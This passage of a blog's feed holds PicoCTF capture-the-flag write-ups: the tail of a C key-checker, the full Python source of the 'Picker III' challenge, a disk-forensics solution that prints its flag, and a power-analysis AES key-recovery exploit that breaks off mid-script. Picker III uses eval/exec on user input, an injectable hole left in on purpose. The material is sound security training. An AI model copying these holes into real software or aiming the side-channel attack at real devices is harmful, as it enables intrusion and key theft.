&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You got the key, congrats! Now xor it with the flag!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Invalid key!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;USAGE: %s [KEY]&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, &lt;span style="color:#f92672">*&lt;/span>argv);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Picker III</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---picker-iii/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---picker-iii/</guid><description>&lt;h1 id="picoctf---picker-iii">
 PicoCTF - Picker III
 &lt;a class="anchor" href="#picoctf---picker-iii">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">
import re



USER_ALIVE = True
FUNC_TABLE_SIZE = 4
FUNC_TABLE_ENTRY_SIZE = 32
CORRUPT_MESSAGE = &amp;#39;Table corrupted. Try entering \&amp;#39;reset\&amp;#39; to fix it&amp;#39;

func_table = &amp;#39;&amp;#39;

def reset_table():
 global func_table

 # This table is formatted for easier viewing, but it is really one line
 func_table = \
&amp;#39;&amp;#39;&amp;#39;\
print_table \
read_variable \
write_variable \
getRandomNumber \
&amp;#39;&amp;#39;&amp;#39;

def check_table():
 global func_table

 if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE):
 return False

 return True


def get_func(n):
 global func_table

 # Check table for viability
 if( not check_table() ):
 print(CORRUPT_MESSAGE)
 return

 # Get function name from table
 func_name = &amp;#39;&amp;#39;
 func_name_offset = n * FUNC_TABLE_ENTRY_SIZE
 for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE):
 if( func_table[i] == &amp;#39; &amp;#39;):
 func_name = func_table[func_name_offset:i]
 break

 if( func_name == &amp;#39;&amp;#39; ):
 func_name = func_table[func_name_offset:func_name_offset+FUNC_TABLE_ENTRY_SIZE]
 
 return func_name


def print_table():
 # Check table for viability
 if( not check_table() ):
 print(CORRUPT_MESSAGE)
 return

 for i in range(0, FUNC_TABLE_SIZE):
 j = i + 1
 print(str(j)+&amp;#39;: &amp;#39; + get_func(i))


def filter_var_name(var_name):
 r = re.search(&amp;#39;^[a-zA-Z_][a-zA-Z_0-9]*$&amp;#39;, var_name)
 if r:
 return True
 else:
 return False


def read_variable():
 var_name = input(&amp;#39;Please enter variable name to read: &amp;#39;)
 if( filter_var_name(var_name) ):
 eval(&amp;#39;print(&amp;#39;+var_name+&amp;#39;)&amp;#39;)
 else:
 print(&amp;#39;Illegal variable name&amp;#39;)


def filter_value(value):
 if &amp;#39;;&amp;#39; in value or &amp;#39;(&amp;#39; in value or &amp;#39;)&amp;#39; in value:
 return False
 else:
 return True


def write_variable():
 var_name = input(&amp;#39;Please enter variable name to write: &amp;#39;)
 if( filter_var_name(var_name) ):
 value = input(&amp;#39;Please enter new value of variable: &amp;#39;)
 if( filter_value(value) ):
 exec(&amp;#39;global &amp;#39;+var_name+&amp;#39;; &amp;#39;+var_name+&amp;#39; = &amp;#39;+value)
 else:
 print(&amp;#39;Illegal value&amp;#39;)
 else:
 print(&amp;#39;Illegal variable name&amp;#39;)


def call_func(n):
 &amp;#34;&amp;#34;&amp;#34;
 Calls the nth function in the function table.
 Arguments:
 n: The function to call. The first function is 0.
 &amp;#34;&amp;#34;&amp;#34;

 # Check table for viability
 if( not check_table() ):
 print(CORRUPT_MESSAGE)
 return

 # Check n
 if( n &amp;lt; 0 ):
 print(&amp;#39;n cannot be less than 0. Aborting...&amp;#39;)
 return
 elif( n &amp;gt;= FUNC_TABLE_SIZE ):
 print(&amp;#39;n cannot be greater than or equal to the function table size of &amp;#39;+FUNC_TABLE_SIZE)
 return

 # Get function name from table
 func_name = get_func(n)

 # Run the function
 eval(func_name+&amp;#39;()&amp;#39;)


def dummy_func1():
 print(&amp;#39;in dummy_func1&amp;#39;)

def dummy_func2():
 print(&amp;#39;in dummy_func2&amp;#39;)

def dummy_func3():
 print(&amp;#39;in dummy_func3&amp;#39;)

def dummy_func4():
 print(&amp;#39;in dummy_func4&amp;#39;)

def getRandomNumber():
 print(4) # Chosen by fair die roll.
 # Guaranteed to be random.
 # (See XKCD)

def win():
 # This line will not work locally unless you create your own &amp;#39;flag.txt&amp;#39; in
 # the same directory as this script
 flag = open(&amp;#39;flag.txt&amp;#39;, &amp;#39;r&amp;#39;).read()
 #flag = flag[:-1]
 flag = flag.strip()
 str_flag = &amp;#39;&amp;#39;
 for c in flag:
 str_flag += str(hex(ord(c))) + &amp;#39; &amp;#39;
 print(str_flag)

def help_text():
 print(
 &amp;#39;&amp;#39;&amp;#39;
This program fixes vulnerabilities in its predecessor by limiting what
functions can be called to a table of predefined functions. This still puts
the user in charge, but prevents them from calling undesirable subroutines.

* Enter &amp;#39;quit&amp;#39; to quit the program.
* Enter &amp;#39;help&amp;#39; for this text.
* Enter &amp;#39;reset&amp;#39; to reset the table.
* Enter &amp;#39;1&amp;#39; to execute the first function in the table.
* Enter &amp;#39;2&amp;#39; to execute the second function in the table.
* Enter &amp;#39;3&amp;#39; to execute the third function in the table.
* Enter &amp;#39;4&amp;#39; to execute the fourth function in the table.

Here&amp;#39;s the current table:
 &amp;#39;&amp;#39;&amp;#39;
 )
 print_table()



reset_table()

while(USER_ALIVE):
 choice = input(&amp;#39;==&amp;gt; &amp;#39;)
 if( choice == &amp;#39;quit&amp;#39; or choice == &amp;#39;exit&amp;#39; or choice == &amp;#39;q&amp;#39; ):
 USER_ALIVE = False
 elif( choice == &amp;#39;help&amp;#39; or choice == &amp;#39;?&amp;#39; ):
 help_text()
 elif( choice == &amp;#39;reset&amp;#39; ):
 reset_table()
 elif( choice == &amp;#39;1&amp;#39; ):
 call_func(0)
 elif( choice == &amp;#39;2&amp;#39; ):
 call_func(1)
 elif( choice == &amp;#39;3&amp;#39; ):
 call_func(2)
 elif( choice == &amp;#39;4&amp;#39; ):
 call_func(3)
 else:
 print(&amp;#39;Did not understand &amp;#34;&amp;#39;+choice+&amp;#39;&amp;#34; Have you tried &amp;#34;help&amp;#34;?&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Pitter, Patter, Platters</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/</guid><description>&lt;h1 id="picoctf---pitter-patter-platters">
 PicoCTF - Pitter, Patter, Platters
 &lt;a class="anchor" href="#picoctf---pitter-patter-platters">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/87?category=4&amp;amp;page=2">Pitter, Patter, Platters&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.gtwang.org/linux/linux-add-format-mount-harddisk/">sda&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h2 id="exploit---use-ftk-imager">
 Exploit - Use FTK Imager
 &lt;a class="anchor" href="#exploit---use-ftk-imager">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>I use Autopsy but find nothing except a txt file
&lt;img src="https://i.imgur.com/7IXjuMn.png" alt="" />
So I follow &lt;a href="https://youtu.be/P0wvFs02oKY">write up video&lt;/a> to use &lt;code>FTK imager&lt;/code> and it can parse files completely.
&lt;img src="https://i.imgur.com/FdC9k3V.png" alt="" />&lt;/li>
&lt;/ul>
&lt;p>ORRRR&amp;hellip;&lt;/p>
&lt;ul>
&lt;li>Use &lt;code>HxD&lt;/code> as auxiliary tool to find flag
&lt;img src="https://i.imgur.com/RTIOn1G.png" alt="" />&lt;/li>
&lt;/ul>
&lt;p>ORRRR&amp;hellip;&lt;/p>
&lt;ul>
&lt;li>Just use string search
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ strings -e l Pitter,\ Patter,\ Platters.sda1 | rev
picoCTF{b3_5t111_mL|_&amp;lt;3_ba880921}
...
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/Dvd848/CTFs/blob/master/2020_picoCTF_Mini/Pitter_Patter_Platters.md">Pitter, Patter, Platters write up&lt;/a>
&lt;a href="https://youtu.be/P0wvFs02oKY">pico 2020 mini pitter patter platters&lt;/a>&lt;/p></description></item><item><title>PicoCTF - PowerAnalysis Part 1 / Part 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/</guid><description>&lt;h1 id="picoctf---poweranalysis-part-1--part-2">
 PicoCTF - PowerAnalysis Part 1 / Part 2
 &lt;a class="anchor" href="#picoctf---poweranalysis-part-1--part-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/HJNScTc-T">Simple Welcome 0x13(2023 HW - Power Analysis):two:&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題幾乎就和上課教的差不多，只是因為有雜訊，所以要慎選trace point，我是直接看第一個trace的分布，決定採用300~400的point，而不管是利用自己刻的correlation coefficient還是用scipy的pearsonr都一樣可以順利解出key但是如果像homework一樣用numpy的corrcoef會有兩個bytes和正解不一樣，超哭，找超久(10/18更新，如果用自己刻的也是要碰用氣，所以如果可以的話，多送幾個trace，或者多用幾個算correlation coefficient的library)
&lt;img src="https://hackmd.io/_uploads/SJ4YLRnZT.jpg" alt="" />&lt;/p>
&lt;ul>
&lt;li>Part 2的部分幾乎一模一樣，就只是他先幫你紀錄好所有的trace，再讓我們做後續的分析&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>首先先把資料從server拉下來，在存成json
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> string &lt;span style="color:#f92672">import&lt;/span> ascii_letters, digits
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> tqdm &lt;span style="color:#f92672">import&lt;/span> trange
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">gen_plaintext&lt;/span>(length):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(random&lt;span style="color:#f92672">.&lt;/span>choice(ascii_letters &lt;span style="color:#f92672">+&lt;/span> digits) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(length))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pt &lt;span style="color:#f92672">=&lt;/span> [gen_plaintext(&lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">50&lt;/span>)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(pt)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>json_file &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#66d9ef">None&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> len(pt)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> trange(len(pt)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;saturn.picoctf.net&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">52339&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;hex: &amp;#39;&lt;/span>, pt[i]&lt;span style="color:#f92672">.&lt;/span>encode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>hex()&lt;span style="color:#f92672">.&lt;/span>encode())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;power measurement result: &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pm &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>decode()&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> json_file[i] &lt;span style="color:#f92672">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> json_file[i][&lt;span style="color:#e6db74">&amp;#34;pt&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> [ord(digit) &lt;span style="color:#66d9ef">for&lt;/span> digit &lt;span style="color:#f92672">in&lt;/span> pt[i]]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> json_file[i][&lt;span style="color:#e6db74">&amp;#34;pm&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> pm
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>json_object &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>dumps(json_file)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;./Crypto/PowerAnalysis- Part 1/trace.json&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> outfile:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> outfile&lt;span style="color:#f92672">.&lt;/span>write(json_object)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>然後再去解析AES key
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> tqdm &lt;span style="color:#f92672">import&lt;/span> trange
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> numpy &lt;span style="color:#66d9ef">as&lt;/span> np
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> copy
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> string &lt;span style="color:#f92672">import&lt;/span> ascii_letters, digits
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> numpy &lt;span style="color:#f92672">import&lt;/span> corrcoef
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> matplotlib.pyplot &lt;span style="color:#66d9ef">as&lt;/span> plt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> scipy.stats &lt;span style="color:#f92672">import&lt;/span> pearsonr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>jsonFile &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./PicoCTF/Crypto/PowerAnalysis- Part 1/trace.json&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>j &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>load(jsonFile)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s_box &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x63&lt;/span>, &lt;span style="color:#ae81ff">0x7C&lt;/span>, &lt;span style="color:#ae81ff">0x77&lt;/span>, &lt;span style="color:#ae81ff">0x7B&lt;/span>, &lt;span style="color:#ae81ff">0xF2&lt;/span>, &lt;span style="color:#ae81ff">0x6B&lt;/span>, &lt;span style="color:#ae81ff">0x6F&lt;/span>, &lt;span style="color:#ae81ff">0xC5&lt;/span>, &lt;span style="color:#ae81ff">0x30&lt;/span>, &lt;span style="color:#ae81ff">0x01&lt;/span>, &lt;span style="color:#ae81ff">0x67&lt;/span>, &lt;span style="color:#ae81ff">0x2B&lt;/span>, &lt;span style="color:#ae81ff">0xFE&lt;/span>, &lt;span style="color:#ae81ff">0xD7&lt;/span>, &lt;span style="color:#ae81ff">0xAB&lt;/span>, &lt;span style="color:#ae81ff">0x76&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xCA&lt;/span>, &lt;span style="color:#ae81ff">0x82&lt;/span>, &lt;span style="color:#ae81ff">0xC9&lt;/span>, &lt;span style="color:#ae81ff">0x7D&lt;/span>, &lt;span style="color:#ae81ff">0xFA&lt;/span>, &lt;span style="color:#ae81ff">0x59&lt;/span>, &lt;span style="color:#ae81ff">0x47&lt;/span>, &lt;span style="color:#ae81ff">0xF0&lt;/span>, &lt;span style="color:#ae81ff">0xAD&lt;/span>, &lt;span style="color:#ae81ff">0xD4&lt;/span>, &lt;span style="color:#ae81ff">0xA2&lt;/span>, &lt;span style="color:#ae81ff">0xAF&lt;/span>, &lt;span style="color:#ae81ff">0x9C&lt;/span>, &lt;span style="color:#ae81ff">0xA4&lt;/span>, &lt;span style="color:#ae81ff">0x72&lt;/span>, &lt;span style="color:#ae81ff">0xC0&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xB7&lt;/span>, &lt;span style="color:#ae81ff">0xFD&lt;/span>, &lt;span style="color:#ae81ff">0x93&lt;/span>, &lt;span style="color:#ae81ff">0x26&lt;/span>, &lt;span style="color:#ae81ff">0x36&lt;/span>, &lt;span style="color:#ae81ff">0x3F&lt;/span>, &lt;span style="color:#ae81ff">0xF7&lt;/span>, &lt;span style="color:#ae81ff">0xCC&lt;/span>, &lt;span style="color:#ae81ff">0x34&lt;/span>, &lt;span style="color:#ae81ff">0xA5&lt;/span>, &lt;span style="color:#ae81ff">0xE5&lt;/span>, &lt;span style="color:#ae81ff">0xF1&lt;/span>, &lt;span style="color:#ae81ff">0x71&lt;/span>, &lt;span style="color:#ae81ff">0xD8&lt;/span>, &lt;span style="color:#ae81ff">0x31&lt;/span>, &lt;span style="color:#ae81ff">0x15&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x04&lt;/span>, &lt;span style="color:#ae81ff">0xC7&lt;/span>, &lt;span style="color:#ae81ff">0x23&lt;/span>, &lt;span style="color:#ae81ff">0xC3&lt;/span>, &lt;span style="color:#ae81ff">0x18&lt;/span>, &lt;span style="color:#ae81ff">0x96&lt;/span>, &lt;span style="color:#ae81ff">0x05&lt;/span>, &lt;span style="color:#ae81ff">0x9A&lt;/span>, &lt;span style="color:#ae81ff">0x07&lt;/span>, &lt;span style="color:#ae81ff">0x12&lt;/span>, &lt;span style="color:#ae81ff">0x80&lt;/span>, &lt;span style="color:#ae81ff">0xE2&lt;/span>, &lt;span style="color:#ae81ff">0xEB&lt;/span>, &lt;span style="color:#ae81ff">0x27&lt;/span>, &lt;span style="color:#ae81ff">0xB2&lt;/span>, &lt;span style="color:#ae81ff">0x75&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x09&lt;/span>, &lt;span style="color:#ae81ff">0x83&lt;/span>, &lt;span style="color:#ae81ff">0x2C&lt;/span>, &lt;span style="color:#ae81ff">0x1A&lt;/span>, &lt;span style="color:#ae81ff">0x1B&lt;/span>, &lt;span style="color:#ae81ff">0x6E&lt;/span>, &lt;span style="color:#ae81ff">0x5A&lt;/span>, &lt;span style="color:#ae81ff">0xA0&lt;/span>, &lt;span style="color:#ae81ff">0x52&lt;/span>, &lt;span style="color:#ae81ff">0x3B&lt;/span>, &lt;span style="color:#ae81ff">0xD6&lt;/span>, &lt;span style="color:#ae81ff">0xB3&lt;/span>, &lt;span style="color:#ae81ff">0x29&lt;/span>, &lt;span style="color:#ae81ff">0xE3&lt;/span>, &lt;span style="color:#ae81ff">0x2F&lt;/span>, &lt;span style="color:#ae81ff">0x84&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x53&lt;/span>, &lt;span style="color:#ae81ff">0xD1&lt;/span>, &lt;span style="color:#ae81ff">0x00&lt;/span>, &lt;span style="color:#ae81ff">0xED&lt;/span>, &lt;span style="color:#ae81ff">0x20&lt;/span>, &lt;span style="color:#ae81ff">0xFC&lt;/span>, &lt;span style="color:#ae81ff">0xB1&lt;/span>, &lt;span style="color:#ae81ff">0x5B&lt;/span>, &lt;span style="color:#ae81ff">0x6A&lt;/span>, &lt;span style="color:#ae81ff">0xCB&lt;/span>, &lt;span style="color:#ae81ff">0xBE&lt;/span>, &lt;span style="color:#ae81ff">0x39&lt;/span>, &lt;span style="color:#ae81ff">0x4A&lt;/span>, &lt;span style="color:#ae81ff">0x4C&lt;/span>, &lt;span style="color:#ae81ff">0x58&lt;/span>, &lt;span style="color:#ae81ff">0xCF&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xD0&lt;/span>, &lt;span style="color:#ae81ff">0xEF&lt;/span>, &lt;span style="color:#ae81ff">0xAA&lt;/span>, &lt;span style="color:#ae81ff">0xFB&lt;/span>, &lt;span style="color:#ae81ff">0x43&lt;/span>, &lt;span style="color:#ae81ff">0x4D&lt;/span>, &lt;span style="color:#ae81ff">0x33&lt;/span>, &lt;span style="color:#ae81ff">0x85&lt;/span>, &lt;span style="color:#ae81ff">0x45&lt;/span>, &lt;span style="color:#ae81ff">0xF9&lt;/span>, &lt;span style="color:#ae81ff">0x02&lt;/span>, &lt;span style="color:#ae81ff">0x7F&lt;/span>, &lt;span style="color:#ae81ff">0x50&lt;/span>, &lt;span style="color:#ae81ff">0x3C&lt;/span>, &lt;span style="color:#ae81ff">0x9F&lt;/span>, &lt;span style="color:#ae81ff">0xA8&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x51&lt;/span>, &lt;span style="color:#ae81ff">0xA3&lt;/span>, &lt;span style="color:#ae81ff">0x40&lt;/span>, &lt;span style="color:#ae81ff">0x8F&lt;/span>, &lt;span style="color:#ae81ff">0x92&lt;/span>, &lt;span style="color:#ae81ff">0x9D&lt;/span>, &lt;span style="color:#ae81ff">0x38&lt;/span>, &lt;span style="color:#ae81ff">0xF5&lt;/span>, &lt;span style="color:#ae81ff">0xBC&lt;/span>, &lt;span style="color:#ae81ff">0xB6&lt;/span>, &lt;span style="color:#ae81ff">0xDA&lt;/span>, &lt;span style="color:#ae81ff">0x21&lt;/span>, &lt;span style="color:#ae81ff">0x10&lt;/span>, &lt;span style="color:#ae81ff">0xFF&lt;/span>, &lt;span style="color:#ae81ff">0xF3&lt;/span>, &lt;span style="color:#ae81ff">0xD2&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xCD&lt;/span>, &lt;span style="color:#ae81ff">0x0C&lt;/span>, &lt;span style="color:#ae81ff">0x13&lt;/span>, &lt;span style="color:#ae81ff">0xEC&lt;/span>, &lt;span style="color:#ae81ff">0x5F&lt;/span>, &lt;span style="color:#ae81ff">0x97&lt;/span>, &lt;span style="color:#ae81ff">0x44&lt;/span>, &lt;span style="color:#ae81ff">0x17&lt;/span>, &lt;span style="color:#ae81ff">0xC4&lt;/span>, &lt;span style="color:#ae81ff">0xA7&lt;/span>, &lt;span style="color:#ae81ff">0x7E&lt;/span>, &lt;span style="color:#ae81ff">0x3D&lt;/span>, &lt;span style="color:#ae81ff">0x64&lt;/span>, &lt;span style="color:#ae81ff">0x5D&lt;/span>, &lt;span style="color:#ae81ff">0x19&lt;/span>, &lt;span style="color:#ae81ff">0x73&lt;/span>],
